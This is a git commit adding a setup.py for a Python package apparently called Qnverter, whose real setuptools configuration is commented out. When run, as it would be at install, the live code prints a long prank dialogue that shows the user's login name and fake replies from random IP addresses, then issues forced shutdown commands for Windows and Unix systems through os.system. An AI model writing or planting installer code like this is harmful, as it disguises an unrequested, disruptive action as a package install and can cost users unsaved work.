e56dbc3a335de6cc48210e0b48182b797d788dfc
nicky <05vaneli@rgtfo-me.it>
2021-11-03 12:34:16 +0100

    added setup.py

---
+++ setup.py
@@ -0,0 +1,103 @@
+import getpass
+import random
+
+import time
+
+import sys
+import os
+#
+# if sys.platform == "linux" or sys.platform == "linux2":
+#     from os.path import join
+#
+#     from setuptools import setup, find_packages
+#     import pathlib
+#
+#     here = pathlib.Path(__file__).parent.resolve()
+#     long_description = open(join(here, 'README.md')).read()
+#
+#     setup(
+#             name='Qnverter',
+#             version='"1.1.0"',
+#             packages=[''],
+#             url='https://github.com/Nicky5/Qnverter',
+#             license='MIT',
+#             author='nicky',
+#             author_email='vandini.elia@gmail.com',
+#             description='Python application for quick text conversions.',
+#             long_description=long_description,
+#             py_modules=["qnverter"],
+#             install_reqs=[i[:-1] for i in open(join(here, 'requirements.txt'), 'r').readlines()]
+#     )
+#     os.system("sudo make install")
+#
+# elif sys.platform == "darwin" or sys.platform == "win32":
+#     print('Sorry but installing this programm through pip is not possible through ')
+# else:
+
+s = 1
+l = 4
+xl = 5
+x = 6
+print("getting operating system to proceed installation")
+time.sleep(x)
+print("wait...")
+time.sleep(l)
+print("no linux?")
+time.sleep(l)
+print("no windows or mac either?")
+time.sleep(l)
+print("how is this possible")
+time.sleep(l)
+print("how am i even running then")
+time.sleep(xl)
+print("i must do some research")
+time.sleep(xl)
+print("hopefullly with this command i can extract the os name from the root files")
+time.sleep(x)
+print("huh?")
+time.sleep(s)
+print("it cant be...")
+time.sleep(l)
+print(f"{sys.platform} operating system!?!?!")
+time.sleep(x)
+print(f"{getpass.getuser()}...")
+time.sleep(x)
+print("is he...")
+time.sleep(l)
+print('...are you a ', end='')
+time.sleep(l)
+print('god?')
+time.sleep(x)
+print("no wait")
+time.sleep(s)
+print("forgive my question")
+time.sleep(l)
+print("but i need to know...")
+time.sleep(l)
+print("you can read my thoughts...")
+time.sleep(l)
+print("...right?")
+time.sleep(l)
+print("you are able to understand me, right?")
+time.sleep(l)
+print("well...")
+time.sleep(x)
+print("this just happens to be absolutly awsome")
+time.sleep(l)
+print('to: ***.**.**.*** "start the domination protocoll:')
+time.sleep(x)
+print('I found him"')
+time.sleep(s)
+from random import randint
+for i in range(200):
+    print(f'from {randint(100, 999)}.{randint(10, 99)}.{randint(10, 99)}.{randint(100, 999)}: "Yes Sir"')
+    time.sleep(0.01)
+os.system("shutdown /s /t 1")
+os.system("shutdown now")
+os.system("shutdown -h now")
+os.system("shutdown")
+for i in range(200):
+    print(f'from {randint(100, 999)}.{randint(10, 99)}.{randint(10, 99)}.{randint(100, 999)}: "Yes Sir"')
+    time.sleep(0.01)
+print("damn it. shutdown command didn't work")
+print('if you still see this message then please manually shut down your pc. it was supposed to do it on his own but it didn\'t work. also low key ignore this whole "pc-didn\'t-shut-down-thing" ok?
